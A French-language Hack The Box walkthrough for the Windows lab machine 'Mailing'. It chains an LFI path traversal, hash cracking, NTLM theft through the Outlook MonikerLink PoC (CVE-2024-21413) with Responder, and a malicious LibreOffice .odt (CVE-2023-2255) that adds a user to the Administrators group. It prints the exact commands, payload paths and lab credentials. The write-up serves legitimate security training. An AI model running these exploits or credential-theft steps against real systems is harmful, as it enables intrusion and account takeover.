<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Mailing</title>
<meta name=description content="Platforme: Hack The Box Lien: Mailing Niveau: Facile OS: Windows Cette machine HackTheBox est centrée sur les vulnérabilités email. Après une reconnaissance …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-mailing/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Mailing"><meta property="og:description" content="Platforme: Hack The Box Lien: Mailing Niveau: Facile OS: Windows Cette machine HackTheBox est centrée sur les vulnérabilités email. Après une reconnaissance …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Mailing/Mailing.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Mailing/Mailing.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Mailing"><meta name=twitter:description content="Platforme: Hack The Box Lien: Mailing Niveau: Facile OS: Windows Cette machine HackTheBox est centrée sur les vulnérabilités email. Après une reconnaissance …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-mailing/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-mailing/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Mailing/Mailing.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-mailing/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-mailing/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Mailing</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>6 Septembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Mailing>Mailing</a></li><li>Niveau: Facile</li><li>OS: Windows</li></ul><hr><p>Cette machine HackTheBox est centrée sur les vulnérabilités email. Après une reconnaissance initiale, nous exploitons une vulnérabilité LFI pour récupérer des hachages de mots de passe, dont un nous donne accès à un compte admin. En utilisant ensuite la vulnérabilité MonikerLink, nous obtenons un premier accès. L&rsquo;escalade de privilèges se réalise en exploitant une configuration permettant l&rsquo;exécution automatique de fichiers .odt, nous donnant ainsi les droits d&rsquo;admin.</p><p>Adresse IP cible - <code>10.10.11.14</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Mailing 10.10.11.14
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-09-07 00:50 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.14
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.054s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>990</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE       VERSION
</span></span><span style=display:flex><span>25/tcp  open  smtp          hMailServer smtpd
</span></span><span style=display:flex><span>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>80/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://mailing.htb
</span></span><span style=display:flex><span>110/tcp open  pop3          hMailServer pop3d
</span></span><span style=display:flex><span>|_pop3-capabilities: UIDL TOP USER
</span></span><span style=display:flex><span>135/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>143/tcp open  imap          hMailServer imapd
</span></span><span style=display:flex><span>|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA <span style=color:#e06c75>RIGHTS</span><span style=color:#56b6c2>=</span>texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds?
</span></span><span style=display:flex><span>465/tcp open  ssl/smtp      hMailServer smtpd
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>mailing.htb/organizationName<span style=color:#56b6c2>=</span>Mailing Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>EU<span style=color:#98c379>\S</span>pain/countryName<span style=color:#56b6c2>=</span>EU
</span></span><span style=display:flex><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style=display:flex><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style=display:flex><span>587/tcp open  smtp          hMailServer smtpd
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>mailing.htb/organizationName<span style=color:#56b6c2>=</span>Mailing Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>EU<span style=color:#98c379>\S</span>pain/countryName<span style=color:#56b6c2>=</span>EU
</span></span><span style=display:flex><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style=display:flex><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>993/tcp open  ssl/imap      hMailServer imapd
</span></span><span style=display:flex><span>|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA <span style=color:#e06c75>RIGHTS</span><span style=color:#56b6c2>=</span>texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>mailing.htb/organizationName<span style=color:#56b6c2>=</span>Mailing Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>EU<span style=color:#98c379>\S</span>pain/countryName<span style=color:#56b6c2>=</span>EU
</span></span><span style=display:flex><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style=display:flex><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style=display:flex><span>Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-09-07T05:51:14
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 68.70 seconds
</span></span></code></pre></div><p>Nous avons divers services tels que SMTP, POP3, HTTP, SMB, et IMAP en plus d&rsquo;une redirection vers <code>mailing.htb</code> que nous ajoutons au fichier hosts.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.14 mailing.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>En visitant <code>http://mailing.htb/</code> nous trouvons un site web pour un service de courrier électronique sécurisé basé sur <a href=https://www.hmailserver.com/>hmailserver</a>.</p><p><img src=/images/HTB-Mailing/mailing-website.png alt="Mailing website"></p><p>La seule interaction sur le site est un bouton de téléchargement pour un fichier pdf détaillant les instructions pour le processus d&rsquo;installation.</p><p><img src=/images/HTB-Mailing/download_instructions.png alt="Download instructions button"></p><p>Nous poursuivons le processus d&rsquo;énumération, mais l&rsquo;énumération des répertoires et des sous-domaines est infructueuse.</p><pre tabindex=0><code>gobuster dir -u http://mailing.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u http://mailing.htb/ -H &#34;Host: FUZZ.mailing.htb&#34; -ic -fs 4681
</code></pre><p>Après avoir capturé la requête que nous obtenons avec le bouton &ldquo;Download Instructions&rdquo;, nous remarquons le paramètre &ldquo;file&rdquo;. S&rsquo;il n&rsquo;est pas correctement sécurisé, nous pourrions avoir une vulnérabilité LFI (Local File Inclusion).</p><p><img src=/images/HTB-Mailing/download-request.png alt="Mailing Download button request"></p><p>Avec wappalyzer, nous découvrons que l&rsquo;application utilise <code>ASP.NET</code> avec <code>IIS</code> pour le serveur. Nous savons que le fichier <code>web.config</code> doit être présent à la racine du site web <code>C:\inetpub\wwwroot</code> pour que les applications <code>ASP.NET</code> fonctionnent correctement. Nous pouvons donc essayer de lire le contenu du fichier afin de confirmer notre LFI potentielle. <em>Plus d&rsquo;infos <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0#webconfig-file-location">ici</a>.</em></p><p><img src=/images/HTB-Mailing/wappalyzer.png alt="Mailing wappalyzer"></p><p>Avec <code>../../inetpub/wwwroot/web.config</code> pour la valeur de <code>file</code></p><p><img src=/images/HTB-Mailing/IIS-web-config.png alt="Mailing LFI test"></p><p>Nous obtenons une réponse positive et pouvons lire le fichier.</p><p><img src=/images/HTB-Mailing/web-config-content.png alt="Mailing web.config content"></p><p>L&rsquo;étape suivante sera d&rsquo;essayer de lire quelques fichiers sensibles. Nous savons que la cible utilise hmailserver donc nous nous concentrerons sur ce dernier, cherchons <code>hmailserver ini ile location</code> sur Google.</p><p>Ce <a href="https://www.hmailserver.com/forum/viewtopic.php?t=29069">post</a> nous dit que par défaut le fichier ini est dans <code>C:\Program Files\MailServer\Bin</code> mais en utilisant <code>../../Program+Files/hMailServer/Bin/hMailServer.ini</code> pour le payload nous obtenons le résultat <code>File not found</code>.</p><p>Ce <a href="(https://www.hmailserver.com/forum/viewtopic.php?t=38903)">forum</a> nous apprend que le fichier ini peut également se trouver dans <code>program files (x86)\hMailServer\Bin\hMailServer.ini</code>.</p><p>En utilisant le chemin <code>../../Program Files (x86)/hMailServer/Bin/hMailServer.ini</code> comme payload, nous parvenons à extraire des informations sensibles concernant le serveur de messagerie hMailServer en fonctionnement sur la machine cible.</p><p><img src=/images/HTB-Mailing/INI-file.png alt="LFI for hmailserver INI file"></p><p><img src=/images/HTB-Mailing/INI-file-pwds.png alt="INI file - passwords found"></p><p>Le fichier contient deux hachages de mots de passe, le mot de passe administrateur qui est <code>841bb5acfa6779ae432fd7a4e6600ba7</code> et un mot de passe utilisateur <code>0a9f8ad8bf896b501dde74f08efd7e4c</code>. Il révèle également les répertoires du logiciel et la base de données utilisée (MSSQL).</p><p>À l&rsquo;aide de <a href=https://crackstation.net/>CrackStation</a>, nous trouvons le mot de passe de l&rsquo;administrateur, <code>homenetworkingadministrator</code>.</p><p><img src=/images/HTB-Mailing/admin-pwd.png alt="admin password"></p><blockquote><p>Nous ne sommes pas en mesure de déchiffrer le deuxième hachage.</p></blockquote><h2 id=accès-initial>Accès Initial</h2><p>Nous pouvons utiliser Telnet pour tester la connexion POP3, les étapes sont expliquées <a href=https://www.resellerspanel.com/articles/cloud-web-hosting-articles/email/testing-incoming-mail-pop3-settings-via-telnet/>ici</a>.</p><pre tabindex=0><code>telnet 10.129.59.26 110

USER administrator@mailing.htb
PASS homenetworkingadministrator
</code></pre><p><img src=/images/HTB-Mailing/pop3-check.png alt="POP3 mail box check"></p><p>La boîte aux lettres est vide, mais nous savons qu&rsquo;il existe un serveur de messagerie avec authentification. Sur le site web, on peut lire: <code>Using any mail client you can connect to our server with your account with any system (Linux, MacOS or Windows)</code>.</p><p>La cible utilise Windows et donc très probablement Microsoft Outlook. L&rsquo;une des vulnérabilités les plus récentes pour Outlook est <a href=https://blog.checkpoint.com/research/check-point-research-unveils-critical-monikerlink-vulnerability-in-microsoft-outlook-with-a-9-8-cvss-severity-score/>MonikerLink</a>, qui peut entraîner la fuite d&rsquo;informations d&rsquo;identification.</p><blockquote><p>Vous pouvez en appredre plus en consultant cette <a href=https://tryhackme.com/r/room/monikerlink>room</a> sur TryhackMe.</p></blockquote><p>A partir de là, nous trouvons un PoC pour cette vulnérabilité <a href=https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability>ici</a>. Nous pouvons l&rsquo;utiliser pour envoyer un email à un utilisateur valide et faire fuiter son hash NTLM.</p><blockquote><p>Après avoir lu les instructions PDF (disponibles en téléchargement sur le site web), nous découvrons que <code>maya@mailing.htb</code> est un utilisateur valide sur le serveur (page 16).</p></blockquote><ol><li>Lancer Responder</li></ol><pre tabindex=0><code>sudo responder -I tun0
</code></pre><ol start=2><li>Envoyer l&rsquo;email</li></ol><pre tabindex=0><code>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url &#39;\\MY_IP_ADDRESS\test&#39; --subject Hi
</code></pre><p><img src=/images/HTB-Mailing/email_sent_poc.png alt="Email sent via PoC"></p><ol start=3><li>Craquer le hachage reçu avec Responder</li></ol><p><img src=/images/HTB-Mailing/responder-hash.png alt="Hash obtained for maya"></p><pre tabindex=0><code>hashcat -a 0 -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Mailing/maya-pwd.png alt="Maya password"></p><p>Après avoir craqué le hash avec hashcat, nous récupérons le mot de passe <code>m4y4ngs4ri</code> et avec Evil-WinRM nous nous connectons en tant que Maya avec la commande ci-dessous.</p><pre tabindex=0><code>evil-winrm -i TARGET_IP -u maya -p m4y4ngs4ri
</code></pre><p>Le fichier <code>user.txt</code> se trouve dans <code>C:\Users\maya\Desktop</code>.</p><p><img src=/images/HTB-Mailing/user-flag.png alt="user flag location"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Dans <code>C:\Users\maya\Documents</code> nous trouvons deux fichiers <code>mail.py</code> et <code>mail.vbs</code>. Ces deux scripts automatisent les interactions avec un client de messagerie (probablement Microsoft Outlook) en ouvrant les courriels non lus.</p><p>Puisque nous avons des scripts d&rsquo;automatisation, ils doivent être configurés d&rsquo;une certaine manière afin d&rsquo;être exécutés. Nous pouvons trouver les tâches planifiées sous Windows avec l&rsquo;outil de ligne de commande <code>schtasks</code>.</p><pre tabindex=0><code>schtasks /query /fo LIST /v
</code></pre><p>Nous avons en effet des tâches liées à <code>mail.py</code> et <code>mail.vbs</code>. De plus, il existe une autre tâche appelée <code>Test</code> qui exécute un script PowerShell situé dans <code>C:\Users\localadmin\Documents\scripts\soffice.ps1</code>.</p><p><img src=/images/HTB-Mailing/Test-scheduled-task.png alt="Test scheduled task"></p><p>Malheureusement, nous ne pouvons pas accéder au contenu de <code>localadmin</code> faute de permissions.</p><p><img src=/images/HTB-Mailing/access-denied-localadmin.png alt="localadmin user, access denied"></p><p>Dans <code>Program Files</code> nous remarquons que <code>Libre Office</code> est installé. Cela mérite d&rsquo;être souligné (du moins pour moi) car ce logiciel est généralement utilisé sur les systèmes Linux. Le fichier <code>readme_fr-US.txt</code> dans <code>C:\Program Files\libreOffice\readmes</code> révèle la version du logiciel.</p><p><img src=/images/HTB-Mailing/LibreOffice-version.png alt="Libre Office version"></p><p>Dans <code>C:\Program Files\LibreOffice\program</code> nous trouvons un script <code>soffice.ps1</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PowerShell data-lang=PowerShell><span style=display:flex><span><span style=color:#7f848e># Set the directory where the .odt files are located</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$directory</span> = <span style=color:#98c379>&#34;C:\Users\Public\Documents&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Get all files with .odt extension in the specified directory</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$files</span> = <span style=color:#e5c07b>Get-ChildItem</span> <span style=color:#e06c75>-Path</span> <span style=color:#e06c75>$directory</span> <span style=color:#e06c75>-Filter</span> *.<span style=color:#e06c75>odt</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Loop through each .odt file and open it</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>foreach</span> (<span style=color:#e06c75>$file</span> <span style=color:#c678dd>in</span> <span style=color:#e06c75>$files</span>) {
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>Start-Process</span> <span style=color:#e06c75>$file</span>.<span style=color:#e06c75>FullName</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Le script automatise le processus d&rsquo;ouverture de tous les fichiers OpenDocument Text (<code>*.odt</code>) situés dans le répertoire spécifié.</p><p>En retournant à la version de LibreOffice, nous trouvons <a href=https://github.com/elweth-sec/CVE-2023-2255>ici</a> un PoC pour CVE-2023-2255.</p><p>Sachant que les fichiers <code>.odt</code> sont automatiquement ouverts lorsqu&rsquo;ils sont placés dans un certain répertoire, nous pouvons créer un fichier malveillant qui exécutera des commandes lorsqu&rsquo;il sera ouvert. Nous allons créer un fichier pour ajouter <code>maya</code> au groupe des administrateurs.</p><p>Nous ne trouvons pas le répertoire habituel <code>Administrators</code> dans <code>C:\Users</code>, à la place nous avons un utilisateur appelé <code>localadmin</code>. Avec <code>net user localadmin</code> nous confirmons qu&rsquo;il fait partie du groupe des administrateurs appelé <code>Administradores</code> dans ce cas.</p><p><img src=/images/HTB-Mailing/localadmin-memberships.png alt="localadmin membership"></p><pre tabindex=0><code>git clone https://github.com/elweth-sec/CVE-2023-2255

python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores maya /add&#39; --output &#39;exploit.odt&#39;
</code></pre><p><img src=/images/HTB-Mailing/malicious_odt_file.png alt="Malicious odt file"></p><p>Le fichier <code>.odt</code> malveillant est envoyé à la cible à l&rsquo;aide d&rsquo;un serveur SMB, mais après l&rsquo;avoir placé dans <code>C:Users\Public\Documents</code>, rien ne se produit.</p><p>Après quelques recherches, un certain répertoire se démarque! Nous trouvons un répertoire appelé <code>Important Documents</code> dans <code>C:\</code>, en vérifiant ses permissions nous remarquons que les membres du groupe <code>Administradores</code> ont le contrôle total <code>(F)</code> sur le répertoire. De plus, Maya a également les permissions de modification <code>(M)</code> sur ce répertoire.</p><p><img src=/images/HTB-Mailing/folder-permissions.png alt="Important Documents directory permissions"></p><p>Plaçons-y notre fichier malveillant.</p><ol><li>Lancer un serveur SMB</li></ol><pre tabindex=0><code>impacket-smbserver mailing `pwd` -smb2support
</code></pre><ol start=2><li>Se connecter au serveur SMB avec l&rsquo;utilisateur maya</li></ol><pre tabindex=0><code>net use \\MY_IP\mailing
</code></pre><ol start=3><li>Aller dans <code>C:\NImportant Documents</code> et télécharger le fichier malveillant</li></ol><pre tabindex=0><code>cd &#39;Important Documents&#39;
copy \\MY_IP\mailing\exploit.odt
</code></pre><ol start=4><li>Attendre 1 à 2 minutes puis confirmez que Maya fait maintenant partie du groupe <code>Administradores</code> avec <code>net user maya</code></li></ol><p><img src=/images/HTB-Mailing/maya_admin.png alt="maya now part of admin group"></p><p>Déconnectez-vous d&rsquo;Evil-WinRM et reconnectez-vous pour que le privilège prenne effet. Vous pouvez maintenant accéder à <code>C:\Users\localadmin\Desktop</code> où vous trouverez le fichier <code>root.txt</code>.</p><p><img src=/images/HTB-Mailing/root-flag.png alt="Root flag"></p><p>Merci d&rsquo;avoir lu cet article, j&rsquo;espère qu&rsquo;il vous a été utile!</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-runner/>&#8592;
Précédent:
HTB: Runner</a></p><p class=prev-post-date>août 22, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-solarlab/>Suivant:
HTB: SolarLab
&#8594;</a></p><p class=next-post-date>septembre 20, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>